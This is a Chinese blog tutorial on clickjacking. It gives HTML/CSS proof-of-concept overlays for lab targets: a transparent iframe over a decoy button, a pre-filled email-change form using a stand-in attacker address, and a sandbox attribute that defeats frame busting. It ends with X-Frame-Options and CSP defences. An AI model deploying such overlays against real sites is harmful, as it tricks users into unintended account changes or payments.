---
layout: post
title: 点击劫持
tags: 劫持
categories: Web安全
---

# 点击劫持（Clickjacking）

Clickjacking是一种基于界面的攻击，其中，通过诱骗用户单击诱饵网站中的某些内容，诱使用户单击隐藏网站上的可操作内容。如下图，当用户点击Win按钮时，实际上是点击了隐藏在当前可视页面下面隐藏的透明网站中的pay按钮。

![](https://github.com/hanyihang/blog-image/raw/master/Web%E5%AE%89%E5%85%A8/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/15912334053769.jpg)

## 普通点击劫持

通过CSS创建和操纵诱饵图层，攻击者将诱饵网站覆盖到目标网站的iframe图层上，诱骗用户点击诱饵网站从而触发被隐藏的目标网站中的点击操作。

![](https://github.com/hanyihang/blog-image/raw/master/Web%E5%AE%89%E5%85%A8/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/15911762950001.jpg)

通过调节div标签的高度和宽度，让div和原始页面中要点击的按钮重合，然后把iframe标签的透明度设为0（opacity: 0;）

```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0;
       z-index: 2;
   }
   div {
       position:absolute;
       top:380px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://ac551f0d1fc0c34d80c387de000b00f3.web-security-academy.net/account"></iframe>
```

## 使用预先填写的表单输入进行点击劫持

一些需要表单填写和提交的网站允许在提交之前使用GET参数预先填充表单输入，其他网站可能需要文本才能提交表单。由于GET参数值构成了URL的一部分，因此攻击者可以修改目标URL预先填充表单输入，并且在诱骗站点上覆盖透明的“submit”按钮。

![](https://github.com/hanyihang/blog-image/raw/master/Web%E5%AE%89%E5%85%A8/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/15912323627429.jpg)

通过调节div标签的高度和宽度，让div和原始页面中要点击的按钮重合，然后把iframe标签的透明度设为0（opacity: 0;）

```
<style>
   iframe {
       position:relative;
       width:500px;
       height: 600px;
       opacity: 0;
       z-index: 2;
   }
   div {
       position:absolute;
       top:465px;
       left:70px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://ac1b1f271f8d765e803028f900450027.web-security-academy.net/email?email=hacker@attacker-website.com"></iframe>
```

## Frame busting scripts（框架清除脚本）

通常可以写一段JavaScript 代码，以禁止iframe的嵌套。这种方法叫frame busting。比如下面这段代码：

`if ( top.location != location ) {
top.location = self.location;}`

这个时候如果还是用以上方式，当打开网站时会提示类似以下的错误（这个页面无法在框架中显示）

![](https://github.com/hanyihang/blog-image/raw/master/Web%E5%AE%89%E5%85%A8/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/15912622175783.jpg)

可以对iframe标签添加一个属性（sandbox="allow-forms"或allow-scripts)

![](https://github.com/hanyihang/blog-image/raw/master/Web%E5%AE%89%E5%85%A8/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/15912629144524.jpg)

```
<style>
   iframe {
       position:relative;
       width:500px;
       height: 600px;
       opacity: 0.2;
       z-index: 2;
   }
   div {
       position:absolute;
       top:445px;
       left:70px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://ac381f281eb4b7c280dc87f200de006b.web-security-academy.net/email?email=hacker@attacker-website.com" sandbox="allow-forms"></iframe>

```

## 预防

* 一个比较好的方案是使用一个HTTP头——X-Frame-Options它有三个可选的值：DENY、SAMEORIGIN和ALLOW-FROM origin

当值为DENY时，浏览器会拒绝当前页面加载任何frame页面；若值为SAMEORIGIN时，则frame页面的地址只能为同源域名下的页面；若值为ALLOW-FROM，则可以定义允许frame加载的页面地址origin。

* Content Security Policy (CSP)

内容安全策略（CSP）是一种检测和预防机制，可缓解XSS和Clickjacking等攻击。CSP通常在Web服务器中以以下形式的返回标头实现：
Content-Security-Policy: policy

其中policy是由分号分隔的一串策略指令。CSP向客户端浏览器提供有关允许的Web资源来源的信息，浏览器可以将这些资源应用于检测和拦截恶意行为。将frame-ancestors指令合并到应用程序的内容安全策略中。

以下指令将仅允许页面加载同源域名下的页面：

Content-Security-Policy: frame-ancestors 'self'

以下指令将完全阻止任何frame页面：

Content-Security-Policy: frame-ancestors 'none'

以下指令将限制允许加载frame的页面：

Content-Security-Policy: frame-ancestors allow-website.com;

使用内容安全策略来防止点击劫持比使用X-Frame-Options标头更灵活，因为您可以指定多个域并使用通配符。例如：
frame-ancestors 'self' https://normal-website.com https://*.robust-website.com